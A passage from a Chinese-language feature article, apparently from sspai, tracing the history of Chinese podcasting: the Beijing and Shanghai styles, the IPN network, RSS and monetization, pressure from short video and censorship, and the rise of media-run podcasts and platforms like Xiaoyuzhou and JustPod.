footnote-id=\"20\">20</sup>。时至今日，大内密谈已录制了超千档节目，是许多人的播客启蒙。</p><p>那时，这些诞生在北京的播客占据了中文播客届的大半江山，也呈现出一定的共性：北方语系、闲聊为主、力图有趣、像电台一样放音乐作为话题过度、广交朋友、嘉宾丰富……对于「播客」这样的外来词并没有很强烈的归属感，仍常常以广播或电台自称。这和人生经历有关。在一档节目里，日谈公园的创始人李志明描述过：「我小时候，电台、收音机能带来娱乐是超过电视的。」李叔说起自己小学时听电台的经验，「因为不敢被家里人发现，就把脸贴在收音机上听，起来之后会被印的一脸大坑。」</p><p>在这一时期成长起来的京派播客，最显著的特点是擅长把控语言的叙事节奏，在情感上和听众建立起陪伴感；话题包含甚广，既聊文娱、也聊人生，并不忌惮地向听众呈现自己生活中的细节。</p><h4>海派</h4><p>2012 年，虎嗅、品玩、钛媒体、少数派、ZEALER、科技美学等一众今日活跃的科技媒体相继成立，这一年也因而成为中文科技媒体的兴起之年。绝大部分媒体以图文为主，网站和微信公众号是主流阵地；而规模较小的则选择转移阵地，去竞争不那么激烈的其他媒介，比如王自如选择的视频；但有的人选择了更小众的媒介。2013 年，「IT 公论」开播，李如一和曾经的爱范儿作者、魅族副总裁，后来的怒喵科技创始人李楠一起讨论苹果在当时发布的新 iPad。</p><p>以播客为主要载体的科技媒体，其形态与常规科技媒体很不一样。首先，驱动用户了解产品的第一要素是图片和参数，这显然不是播客擅长提供的；文字和视频创作者可以围绕体验再做文章，让用户了解得更为全面。这方面，看自然比听更具效率。不过，由于播客的篇幅更长，能够讨论的深度比文字与视频多了很多，许多在文章或视频里略为拖沓节奏、冗长的片段，在播客中可以不多修缮地保留。当然，也正因为聊得更多更深，播客的制作后期也会比文章和视频长出一个周期。而这恰好产生了错位竞争，人们听到播客时往往已经了解了产品的基础信息，倒也省去了在音频中复述的枯燥。</p><p>然而这一类型最终没能成长起来。由于缺乏新闻的时效性，又失去了以图片和视频传递信息的多元性，纯粹的音频难以替代科技媒体的作用。许多一张图片可以清楚标识的产品，在描述时却要费上大量言辞，无法形成叙事。「IT 公论」在上线两年半后停播，后来演化为<a href=\"https://ipn.li/faq\" target=\"_blank\">「一天世界」</a>。</p><p>虽然「IT 公论」走到了尽头，对于播客这种媒介，李如一仍十分看好。2014 年，随着「IT 公论」积攒起一批核心用户后，李如一组建了「IPN 播客网络（Intelligent Podcast Network）」，囊括十数档不同类型、不同话题的中文播客。纯色底配上方块字，令 IPN 旗下播客在当时的一众播客里特立独行。与糖蒜所代表的京派播客相似，IPN 播客网络也为气质相近的播客们起到了聚集效应，提倡泛用型播客客户端、使用 Fireside/Typlog 等海外托管平台、主播或嘉宾多有海外留学/工作经历等，都是海派播客的代表性特质。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/39357e768447bc4157fad8a98cb6df15.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/39357e768447bc4157fad8a98cb6df15.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://ipn.li/\" target=\"_blank\">IPN 播客网络</a></figcaption></figure><p>海派播客在此时兴起与时代背景不无关系。根据国家统计局的数字，自 2008 年后，我国留学生数量不断增长，一直到 2012 年都保持着 20% 左右的同比增长幅度，学成后的回国比例更是从 2002 年的 14% 一跃至 68%。留学生人群的增长带来了不同于国内的、国外播客行业的制作与收听经验，补充了原本继承广播传统、以网络电台作为自我身份认同的京派播客所建立的市场。</p><p>更重要的是，海派播客一定意义上补充了垂类内容市场，譬如以聊博物馆学为目的的「博物志」，面向设计爱好者的「Anyway.FM」「UX Coffee」，主聊文学的「不可理论」等等。同一时期内，京派主播的魅力在于叙事节奏，海派主播的魅力则在于专业内容，这也是后来所谓「湿货/干货」的区分依据。</p><p><strong>如果非要对京海派做一个听众体验上的对比，那可能是这样的：前者用真诚的态度让你认为「这人不错」；后者用缜密的逻辑令你觉得「这话挺对」。</strong></p><h4>京海派的商业化探索</h4><p>相比起糖蒜所代表的萌芽阶段，在中文播客的第二波热潮里，京海派播客的一大进步来自于其对商业化的探索。</p><p>在即刻筹备播客 app 的初期，Kyth 发表了一篇文章<sup href=\"https://mp.weixin.qq.com/s?__biz=MzI1OTAxMDY5Nw==&amp;mid=2657350238&amp;idx=1&amp;sn=f3c698048e2dcdeb50233a44178b9de1&amp;chksm=f1e82bb8c69fa2ae8c18d3908a772880e9e5b22b5eea978ee2459e38ea64e87502468a7cea3f&amp;mpshare=1&amp;scene=1&amp;srcid=06037YPtPw1IeSBA3adnHssw&amp;sharer_sharetime=1654258083464&amp;sharer_shareid=a109e2e60d5a1583230d1ce2755fce90#rd\" title=\"Kyth：RSS 二十年\" footnote-id=\"21\">21</sup>，讲解了 RSS 技术二十年来的变化。其中提及，「古典 RSS 设计没有商业模式，甚至是反商业的」。的确，RSS 抓取在 PC 网站时代并不明显的缺点，在移动互联网时代渐渐变成了硬伤：由于入口不同，用户们被割裂在不同的 app 里，创作者无法掌控文章的排版、得到用户的实时反馈，连打广告都会被屏蔽，可以说是困难重重。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/14bf3036a5f42219dd6633b72640a86c.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/14bf3036a5f42219dd6633b72640a86c.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://mp.weixin.qq.com/s?__biz=MzI1OTAxMDY5Nw==&amp;mid=2657350238&amp;idx=1&amp;sn=f3c698048e2dcdeb50233a44178b9de1&amp;chksm=f1e82bb8c69fa2ae8c18d3908a772880e9e5b22b5eea978ee2459e38ea64e87502468a7cea3f&amp;mpshare=1&amp;scene=1&amp;srcid=06037YPtPw1IeSBA3adnHssw&amp;sharer_sharetime=1654258083464&amp;sharer_shareid=a109e2e60d5a1583230d1ce2755fce90#rd\" target=\"_blank\">Kyth：RSS 二十年</a></figcaption></figure><p>前段时间，少数派也关闭了运营多年的 RSS 服务，老麦在<a href=\"https://sspai.com/post/71637\" target=\"_blank\">说明文章</a>中解释到，少数派几年来从中获取的报酬少之又少，因此才最终决定关停。</p><p>显然，在博客向今日头条、微信公众号等平台的演化里，平台方跑通了商业流程，内容创作者们在这里统一处理排版、面对用户，积累起粉丝后可以做广告、带货、卖课、社群等一系列变现行为，而商业能力低下的 RSS 便逐渐成为时代的眼泪。2013 年，Google 宣布关停全球最大的 RSS 阅读器 Google Reader，宣告了一个时代的结束。少数派在近十年后才关上自家的 RSS 服务，也算是用爱发电了很久，大概是时代大门关闭后的回音。</p><p>而同样是 2013 年，糖蒜广播采访了基努里维斯；大内密谈刚刚成立；李如一建立起了 IPN 播客网络。京海派播客逐渐兴起时，新兴音频平台的喜马拉雅、荔枝们并没有像微信或今日头条那样成为全民级的应用，播客也一直不是主流音频市场的消费内容。这就导致，主流播客听众还在使用对标 RSS 阅读器的 APP（如 Podcast）来收听播客。李如一将这类产品称之为「泛用型播客客户端」。时至今日，仍然有许多听众在使用类似的产品收听播客，譬如大名鼎鼎的 Castro、Overcast、Pocket Casts 等等。在一条被验证过商业无能的道路上，播客们仍走得义无反顾。</p><p>商业不成熟则市场不成熟，面对尚需耕耘的播客商业化之路。京海派各自做出了自己的探索。</p><p>在糖蒜帮助下建立的机核广播，从最初的试水电台，发展到后来的围绕游戏又不止于游戏的 UGC 社区，商业模式包含线下的核聚变，线上的有声书，实体周边的吉考斯工业，在京派播客中表现亮眼。而同时期的 IPN 播客网络，在李如一的推动下以付费会员和 newsletter 为主要的收入方式。广告、打赏、周边，这些在京海派播客时期逐渐成规模的商业模式，至今仍是大部分播客的营收来源。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/a7d423e84ce4b4be99f85dec063b8120.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/a7d423e84ce4b4be99f85dec063b8120.png\" referrerpolicy=\"no-referrer\"></figure><h4><strong>一些「毫不相干」的事情</strong></h4><p>别把巧合当命运，也别把命运当巧合。乔布斯在那次著名的演讲中提到，「我们无法预知未来，但当你回首往事，那些事物最终会联系在一起」。</p><p>Connecting the dots. 在二十一世纪一十年代的下半期，就有那么一些看似不相关的事情最终改变了中文播客市场。</p><p>同阶段的音频市场，正走向知识付费的道路。2016 年初，北京 798 园区的 751D·Park 上，正组织着一场由极客公园召开的 GIF 创新大会，在活动上，<a href=\"https://www.ifanr.com/609819\" target=\"_blank\">老罗踌躇满志地宣称自己不会做千元机</a><sup href=\"https://www.ifanr.com/609819\" title=\"爱范儿：老罗再次登台，聊了聊年轻的自己与手机性价比\" footnote-id=\"22\">22</sup>；另一个老罗，正筹备着「得到」产品的罗振宇则在演讲时做出判断，预计到 2019 年时知识付费将成为一个风口。不过现实发展得比他想象的快，2018 年重回到这个演讲台时，他已经在分享<a href=\"https://www.donews.com/news/detail/4/2985763.html\" target=\"_blank\">得到两年拿下一千五百万用户的商业成绩了</a><sup href=\"https://www.donews.com/news/detail/4/2985763.html\" title=\"DoNews：罗振宇现身极客公园创新大会 揭秘得到 App 的 4 个底层密码\" footnote-id=\"23\">23</sup>。</p><p>而同在 2016 年的创新大会上，有一家创立不久的新公司凭借一款 RSS 应用拿到了「年度创业新星」的奖项，后又在那年稍晚些时候拿到 B 轮融资。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/a08d53e4884b2758489d45072e62a124.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/a08d53e4884b2758489d45072e62a124.JPG\" referrerpolicy=\"no-referrer\"><figcaption>拍摄 by 拐子狼</figcaption></figure><p>此后，一次尝试转型的更新后，社区助手回应一些用户问题时说：「大家放心，即刻既不会做社交也不会做社区，即刻有很明确的发展方向。」这后来成为即刻社区里著名的梗图。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/5f31fc54a0175528a8ea7db29ec19b64.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/5f31fc54a0175528a8ea7db29ec19b64.JPG\" referrerpolicy=\"no-referrer\"><figcaption>即刻有明确的发展方向</figcaption></figure><p>即刻的<a href=\"https://aiqicha.baidu.com/brand/detail?pid=31987779329285&amp;id=407121419\" target=\"_blank\">转型并不是一蹴而就</a><sup href=\"https://aiqicha.baidu.com/brand/detail?pid=31987779329285&amp;id=407121419\" title=\"即刻融资信息\" footnote-id=\"24\">24</sup>，从当时的这段回复也可以看出，甚至都未必是主观意愿，更可能是<a href=\"http://www.capwhale.com/newsfile/details/20191106/d3f964b157594763804bcac730b88994.shtml\" target=\"_blank\">接受融资后基于商业的考量</a><sup href=\"http://www.capwhale.com/newsfile/details/20191106/d3f964b157594763804bcac730b88994.shtml\" title=\"锌财经：即刻收购一罐“借尸还魂”，社交创业太难做\" footnote-id=\"25\">25</sup>。在即刻逐步转型的背后，是过去十年简中网络里对媒体、自媒体、以及以 RSS 订阅为主的资讯平台的审核与管控制度的逐渐建立。</p><p>一个鲜明的案例是字节跳动。根据<a href=\"https://mp.weixin.qq.com/s/Chd2P4AFMrw9gMnOtIrcWw\" target=\"_blank\">晚点的报道</a><sup href=\"https://mp.weixin.qq.com/s/Chd2P4AFMrw9gMnOtIrcWw\" title=\"晚点 LatePost：字节跳动怎么都十万人了？\" footnote-id=\"26\">26</sup>，字节的员工总数在近年来不断膨胀，自 2016 年的数千人猛涨至 2020 年的超十万人，其中审核员占据的不小的比例。尤其在 2017 年，由于大量招募审核员，字节此前不断上涨的人均产生营收从 2016 年的 300 万人民币拦腰斩落至 150 万。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/b411caba9a7eae3bb94a089645266621.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/b411caba9a7eae3bb94a089645266621.png\" referrerpolicy=\"no-referrer\"></figure><p>从庞大的数字可以看出，审核员已是中文互联网内基数巨大的基础建设之一，而内包审核员甚至是巨头公司的护城壁垒之一。2018 年，字节旗下的内涵段子社区遭遇永久封禁，此后字节再次加快招聘审核员的步伐。而在这疯狂的招工浪潮里，有超过两万岗位是内容审核员。</p><p>说来也是神奇，反乌托邦小说里被描述成极尽权势与危险的思想警察，真正出现在现实里却只是个月入几 K 还有猝死风险的打工人。</p><h4><strong>短视频与播客必有一战，吗？</strong></h4><p>短视频与播客必有一战吗？有时会有这样的讨论。但事实是，这场战争还没开始就已经结束了。或者说，正是由于短视频的大杀四方，播客才得以迎来第三次发展热潮。</p><p>2018 年后，在上游，智能手机铺货增长量遭遇瓶颈，移动互联网普及，陆续有玩家落幕，锤科所处的那个风云变幻、精彩纷呈的手机市场不复当年。</p><p>2018 年初的 GIF 创新大会上，老罗的锤子手机凭借千元机坚果系列终于有熬出头的趋势，他继续<a href=\"http://www.geekpark.net/news/226246\" target=\"_blank\">踌躇满志地宣布</a><sup href=\"http://www.geekpark.net/news/226246\" title=\"极客公园：罗永浩 2018 年的第一场「相声」，极客公园 IF 大会访谈|视频完整版\" footnote-id=\"27\">27</sup>，年中时锤科将在鸟巢发布一款「革命性的、颠覆性的产品」，成为「下一个世代的主流计算平台」。很不幸，这款产品发布后，原本刚有起色的锤科业绩一落千丈，供应商上门逼款，公司被卖给字节主攻教育行业的硬件市场，最终又伴随教育行业双减政策落地而溃败解散，老罗一番左牵锤、右提灯的操作后，也被迫走上直播带货「真还传」的道路。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/3dc4c0f6f862b1d7289a80b506923331.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/3dc4c0f6f862b1d7289a80b506923331.JPG\" referrerpolicy=\"no-referrer\"><figcaption>曾经的锤子发布会，老罗和他的锐丽另类 拍摄 by 拐子狼</figcaption></figure><p>在中游，审核、管控日益加码，平台们或在沉默中转型，或继续沉默；在下游，面对短视频市场的猛烈爆发，播客几年来积攒的用户显得杯水车薪。在播客主播们还在争论口播广告的收听体验、高光混剪该不该存在时，短视频主播早已赚得盆满钵满。据 CNSA 发布的<a href=\"http://www.cnsa.cn/module/download/down.jsp?i_ID=27770&amp;colID=1589\" target=\"_blank\">《2019 中国网络视听发展研究报告》</a>显示，到 2018 年 12 月，<a href=\"http://www.cac.gov.cn/2019-05/28/c_1124552171.htm\" target=\"_blank\">短视频用户规模已达到 6.48 亿人</a><sup href=\"http://www.cac.gov.cn/2019-05/28/c_1124552171.htm\" title=\"人民网：《2019 中国网络视听发展研究报告》发布 2018 年中国网络视听行业呈现 12 大特点及趋势\" footnote-id=\"28\">28</sup>，相比 2018 年 6 月，半年间增长 5395 万，网络音频用户规模则刚刚突破 3 亿；在新入网用户中，几乎每两人就会有一人尝试短视频，而差不多每十人才会有一人尝试网络音频；<a href=\"https://www.iresearch.com.cn/Detail/report?id=3909&amp;isfree=0\" target=\"_blank\">艾瑞咨询的数据</a><sup href=\"https://www.iresearch.com.cn/Detail/report?id=3909&amp;isfree=0\" title=\"2021 年中国网络音频产业研究报告\" footnote-id=\"29\">29</sup>更是指出，2017 年，网络音频的市场规模在 56.1 亿元，略高于短视频市场的 55.3 亿元。但仅仅一年后的 2018 年，短视频市场规模至 467.1 亿元，同比增长 744.7%，网络音频市场规模则是 113.3 亿元，同比增长 102.2%。此后，短视频市场继续高歌猛进，网络音频市场的同比增长率则一路下滑。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/ed4a169777d035e4f06d1b2fcae7ac08.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/ed4a169777d035e4f06d1b2fcae7ac08.png\" referrerpolicy=\"no-referrer\"><figcaption>短视频市场规模一年之间巨量增长</figcaption></figure><p>1906 年，广播发明，人类拥有了顺风耳，可以迅速了解到千里之外发生的事情。在短短 19 年后，电视的诞生又使视频这一媒介走进千家万户，千百年以来的家庭布局被改变，围绕电视的摆放位置建立起了新的餐桌礼仪。虹吸效应下，许多广播领域的人才被电视浪潮吸引而去，音频不及视频成为了市场中的少数。百年以后，同样的事情在中文互联网再次发生。</p><p>上中下游三线疲软，新的内容媒介势不可挡。用着过时的 RSS 技术的播客似乎要不可避免地走向衰退了。</p><p>但新的变化开始了。</p><h3>2019-2020：短视频、媒体、直播、厂牌</h3><p>京海派，或者说南北派播客曾是播客圈津津乐道的话题之一。但时至今日，仍以此标签去定义当下的流行播客的话，未免显得有些不合时宜。实际上，在 2019 年后，从运作方式、主理人背景来看，绝大多数的头部播客都可以被称作「媒体播客」。</p><p>前文有提到，我在 2020 年 10 月时搜集了当时所有小宇宙首页的播客数据，得出了一些有趣的结论。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/af04c1dfa2c47aacdb62605fa1a9d393.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/af04c1dfa2c47aacdb62605fa1a9d393.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://heavenly-heath-9c0.notion.site/2468cdaf596948859418f6058755f9ca?v=7f5fcf6e565242cbaab3a1815307f4c4\" target=\"_blank\">2020 年 10 月小宇宙平台首页播客数据</a></figcaption></figure><p>在小宇宙首页推荐功能上线后的 208 天内，共有 196 档播客被推上首页，包含近 600 条单集节目。其中订阅量最高的是「随机波动 StochasticVolatility」「忽左忽右」「日谈公园」「梁文道·八分」「声东击西」；近两年过去，这五档节目仍然处于前十的榜单之中。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/28f453898c759d53e5bccf2e66d0af7d.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/28f453898c759d53e5bccf2e66d0af7d.png\" referrerpolicy=\"no-referrer\"><figcaption>小宇宙 App 前十榜单</figcaption></figure><p>两年前，小宇宙前十播客榜单的平均订阅量为 24539，那时订阅数破万的就已是妥妥的头部播客，整个小宇宙里只有 26 档；如今前十榜单的平均订阅量为 250074，平均增量达到 225535，平均增幅 919.11%。而过万订阅的万员俱乐部播客数目来到了 256 档，近乎十倍。订阅数 10W+ 的播客也有了 27 档。在前 20 榜单里，只有「姜思达」「商业就是这样」是 2020 年十月后开设的播客，其他播客都已更新两年以上。</p><p>这些头部播客绝大部分主播都是或曾是媒体行业从业者，有专门的录音室，有些还有专职的剪辑员，规模与京海派时期的播客主播们已不在一个量级。</p><p>这是一件很有意思的事情。诚然，在自媒体时代，任何内容创作者在规模化后自然会不可避免地走上媒体化的道路，这是保证稳定生产的方法论之一。比如京海派播客时期的「IT 公论」，与之后矩阵化的 IPN。但 IPN 更像是一个松散的邦联，并不像企业那样有紧密联系的规则和组织架构。简单点讲，任何产业的正常发展规律都是从工匠走向生产线，自下而上地升级技术。在中文播客行业里，往往是时代背景的变动促成新晋平台或技术，再影响生产端发生迭代。而在 2019 年以来的中文播客第三次成长期里，并没有出现互联网、移动互联网普及这样重大的历史机遇，听众消费需求和场景里，也仅有 TWS（真无线蓝牙耳机）逐渐流行这样一个不大不小的硬件革新，从火候上来说远不如前两次播客浪潮，从效果来看却是中文播客目前为止最迅猛的一次体量成长。</p><h4>真理孕育于对话，流量孕育于短视频</h4><p>那到底是什么导致了媒体类播客大幅增加呢？</p><p>如前所述，播客乃至音频市场在过往两三年里没有大的变化；那么答案自然是媒体自身的环境。随着简中信息网络的舆论风向的收紧，原本风靡的谈话类节目渐渐退出了人们的视野。譬如锵锵三人行就在 2017 年停播，圆桌派等衍生节目也因话题过于收窄而难产多年，前段时间又爆出<a href=\"https://mp.weixin.qq.com/s/b6sPJc0GsZujx_RkgKaI3A\" target=\"_blank\">腾讯新闻团队内一些栏目组的转岗和解散，包括十三邀节目背后的团队</a><sup href=\"https://mp.weixin.qq.com/s/b6sPJc0GsZujx_RkgKaI3A\" title=\"晚点 LatePost：腾讯新闻转型不成功，管理层大调整\" footnote-id=\"30\">30</sup>。主流媒体中的谈话类节目越来越少。这还不是最主要的原因。在忽左忽右第一期节目，上线于 2018 年初的「美国媒体如何续命」里，就有讨论美国媒体面临的颓势与转型。同一时代下，中文媒体面对的困境是相似的，甚至因为中文世界更加兴盛的移动互联网而面对更大的挑战。在所有的困难重，除了市场化、互联网化以外，最大的影响还是碎片化。</p><p>传播学是一门很新的学科，新到我们知道它的发明人是谁。就借用威尔伯·施拉姆的名言，如果把人类的历史看成一天，那么直到午夜前 7 分钟才出现了文字，而午夜前 3 秒计算机才诞生。就在这三秒内，信息化时代空前绝后地展开，如今人们一天内在各类媒介上所摄取的信息总量，可能是古人数个月甚至数年的阅历总和。如此日新月异的变化使内容更新迭代的节奏极其之快。在十年前，报刊亭里买份报纸或杂志还是很多人的日常习惯；而现在，很多人可能已经很久没有见到过报刊亭了。</p><p>在这门遭遇日新月异的信息化时代冲击的产业里，很多工作变得和过去不一样了；电视台媒体的编导工作不再适宜网络视频介质，摄影机等硬件设备的操作方式也发生了变化，文字工作更是从刊载于报纸变成了网站、公众号。而在近两年的短视频风潮冲击下，已经有很长一段时间，无论新闻还是热点事件，冲上热搜的原始内容都是视频形式了。公众号作为上一次媒体艰难转型后所剩不多的一亩三分地，也渐渐地不再享受流量的倾斜。媒体人擅长的刊载长文、事件调查，在屡次转型后能被压缩为公众号特稿类型的非虚构写作已经难得，如今难有余力去转变成节奏飞快的短视频了。</p><p>从公众号的存量市场以外开辟新战场，同时继续从事擅长的长内容创作。在圆桌派、十三邀等长视频尝试被证明难以复制后，播客作为市面上难得一见的长内容载体，而且是谈话类为主流的长内容载体，成为了屡遭打击的媒体行业续命的选择。</p><p>市场的变化也验证着这一结果。JustPod 的创始人杨一在 2015 年时便受到 NPR 的播客节目的启发，制作了自己的播客节目。但当时并没有多少受众，最终在几个月后停更。等到 2019 年程衍樑与他创立忽左忽右时，市场才做好接纳媒体播客的准备。或者换句话说，相比起 2015 年时较多的选择，当时间来到 2018、2019 年后时，当抖音快手的背景乐频繁地在公共空间里响起，锵锵三人行曾经的观众们发现，市面上百花齐放的众多媒介中，能承载他们所期待的谈话类内容的，就只有播客了。市场使受众们被迫做出习惯上的改变。</p><h4>平台：第三世代</h4><p>在以媒体为主的第三次中文播客浪潮中，同样有新的平台出现。<a href=\"https://sspai.com/post/57960\" target=\"_blank\">2018 年的 Moon FM；2019 年的 Baucast、海盗电台；2020 年的小宇宙、皮艇；2021 年的荔枝播客、汽水儿等等</a><sup href=\"https://sspai.com/post/57960\" title=\"张奕源 Nick：全平台播客订阅及收听指南\" footnote-id=\"31\">31</sup>。</p><p>除了新兴平台，传统的音乐流媒体在看到海外市场以 Spotify 为首的高调入局播客的市场行为后，也加大了对播客类目的投入。网易云音乐将原本对标抖音的音乐视频入口替换为播客入口，QQ 音乐与小宇宙达成战略合作。</p><p>此外，2021 年初爆火、一码难求的 Clubhouse 又将许多人的耳朵吸引到音频直播这一窗口，喜马拉雅随后推出 MyClub，成为 Clubhouse 封禁后国内播客创作者音频连线的选择之一。MyClub 也被喜马拉雅视作为比现有播客业务更重要的押宝赛道。</p><p>在 Clubhouse 带起的音频直播与播客录制融合的播客风潮前，国内播客的远程连线往往使用飞书、腾讯会议等 SaaS 类工具进行语音通话，以保证延迟和录音质量损失在可控范围内。而在当下选择多了很多，直播比企业工具增加了听众参与的机会，也顺便帮缺乏宣发资本的播客们做了预热。</p><p>不过市场仍未明朗，在 MyClub 以外，不少创作者也会选择近两年上线的微信直播功能来做视频与音频的同步直播。显然，微信对受众的连接更直白，触达面也更广。对于已成头部的播客厂牌而言，增加一个视频露脸的机遇也不费成本、没有损失。</p><p>JustPod 就以微信直播的形式录制了许多期节目，并联动出版社推出过读书相关的联名节目。像少数派的「一派·Podcast」、潘乱的「乱翻书」等科技媒体也常以微信连麦的方式录制播客。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/4bdcd8bc589d91012c8e6d4f8c038b90.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/4bdcd8bc589d91012c8e6d4f8c038b90.png\" referrerpolicy=\"no-referrer\"></figure><p>除了以上的 RSS 和音频平台外，还有一种特殊的平台在这两年颇受瞩目。这就是以知识付费为主要形式的媒体平台。包括看理想、财新、三联中读等。如果说看理想更多地对标的是得到的知识付费音频形式，那财新、三联中读就更偏向于本章节所重点叙述的媒体的播客转型了。这也是承袭了海外媒体品牌如纽约时代等集团型媒体的转型经验。出于知识付费的壁垒限制，像「财新十周年特别报道」等非常优秀的、拥有一手数据和资料，由记者亲述的播客并不在市场上流通。看理想中除了道长的「八分」等少数免费对外的、有 RSS 外链的节目外，大部分也因收费墙不为人所知。三联中读也是如此，相比财新以资讯为主的彻底的媒体路线，三联中读站在媒体与知识付费之间，既有资讯播报也有知识卖课。还有些媒体如极客公园，则依托微信公众号的基地，同样推出了语音资讯播报的服务，某种意义上也是播客的变种。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/736466927c49c353034546201af09d8b.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/736466927c49c353034546201af09d8b.jpg\" referrerpolicy=\"no-referrer\"><figcaption>财新十周年调查报告 目前已从平台上消失</figcaption></figure><p>如果说海外播客市场是由于 Serial 这一真实案件调查的系列节目才得以爆火，那么中文市场里最有对标资质和希望的也许就是财新的调查报告。作为为数不多的中文资讯节目，「财新十周年调查报道」仍是我目前听过的最专业的中文案件调查类播客。然而出于某种不可知的原因，相关节目在财新 app 上已经消失。</p><h4><strong>媒体播客的长处与短处</strong></h4><p>或许这也意味着中国市场与海外市场的不同。审核的红线垂于脖颈，调查类节目面临的风险未知。播客想要真正打开商业化的道路，就不能照抄海外播客兴起的路线。同样，谈话类节目的小众市场，也会面对可能消失的境遇。目前仍稳坐小宇宙粉丝量头把交椅的播客「随机波动」，就是早前因谈论疫情而遭封禁的「剩余价值」播客的新生。曾登上小宇宙第一期首页推荐的知名女性和社会类话题播客「海马星球」，目前也已经遭到封禁。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/b9af62e2b90ffd9d2817ec9b45d293bc.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/b9af62e2b90ffd9d2817ec9b45d293bc.png\" referrerpolicy=\"no-referrer\"><figcaption>小宇宙第一期首页推荐</figcaption></figure><p>但这也并不代表媒体播客前景渺茫。在传统的文字市场，为了应对商业、互联网、审核等多方面的冲击，如今流行的调查报道更多以特稿的形式展示。特稿一方面融入了写作者的个人身份以避免整个平台遭受冲击的风险，另一方面也学习影视中的 POV 视角，作为非虚构的故事形式，拉近读者与真实事件的距离。媒体播客也有类似的叙事类尝试，譬如脱身于大象公会的「故事 FM」。而 JustPod 参考美国播客市场龙头 NPR 的制作方式，推出与时尚先生杂志旗下媒体先生制造合作的「JustPod 制造」系列，以扎实的特稿文本为基础尝试推动市场。此前也推出过与上海师范大学都市文化研究中心合作的「浦江往事：百年上海红色印记」系列，同样有扎实的文稿支撑。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/b07064a7462b95d77128cbaad960bccc.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/b07064a7462b95d77128cbaad960bccc.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://mp.weixin.qq.com/s/F29Wneep7wsPlDnAeTwj9g\" target=\"_blank\">JustPod 联合 NPR 开展播客工作坊活动</a></figcaption></figure><p>不过，时至今日，相比起海外市场叙事类播客的火热，讲故事的播客在中国依然不是主流。原因其实不难揣测：叙事类内容的市场大头都已经被短视频占据。优质的电影、电视剧等流媒体时代中文内容在如今疫情的环境下更是少得可怜。这样的前提下，音频领域的叙事类长内容尽管有一定受众，但不做知识付费就几无回本可能。因为把观点融入故事之中是为了更好地传播，而中文市场里喜欢听故事的人群虽然丰富，优质长内容的消费市场却并没有完全培养起来。多年以来狗尾续貂的电视剧、强硬升华的电影们数不胜数，文学名著的销量也远远赶不上逆袭网文。人们更情愿在数十秒的短视频内看反转、看舍去了修饰的搞笑桥段，而不愿多瞧文学性的伏笔、情绪渲染和人物弧光的铺垫。然而媒体性质的播客创作者还是更擅长通过声标、贴片音乐等手段慢节奏地进入语境，这是过去的谈话类节目流传下来的制作经验。于是，叙事类播客在中文领域，反而变成了本就为谈话类节目受众，又同时喜欢听故事的小众用户们的偏爱了。</p><p>相较于京海派时期的播客，媒体播客的出现填补了中文播客领域专业性、机构性的空白，比起邦联性质的松散联盟，媒体播客们旗下的矩阵更加一体化，有统一的选题会、录音室、后期工作、宣发流程，内容调性更为相近，对外商务也是作为一个整体参与。</p><p>媒体播客更庞大的体量，使其在商业化上也有了更多的选择。JustPod 早期就以 to B 业务为主来养活 toC 内容。也诞生了类似 MCN 的制作机构，譬如「贤者时间」的制作方 Marcast。这些都是媒体播客入场带来的产业良性发展。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/8d1a1b9ca2c20f9e6fb9730cd38cf837.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/8d1a1b9ca2c20f9e6fb9730cd38cf837.JPG\" referrerpolicy=\"no-referrer\"><figcaption>杨一和 JustPod 部分播客矩阵 拍摄 by 拐子狼</figcaption></figure><p>但另一方面，不论是 RSS 技术再次兴起、小圈子，还是强势的头部话语权垄断致使话题和观点集中，又都是媒体播客所强化的、原本行业内就存在的弊端。毕竟媒体从业者有着对审核的天然 PTSD，以上种种保护行为，某种程度上也是为了保留能够在节目中侧旁敲及地谈论时事的机会。</p><p>RSS 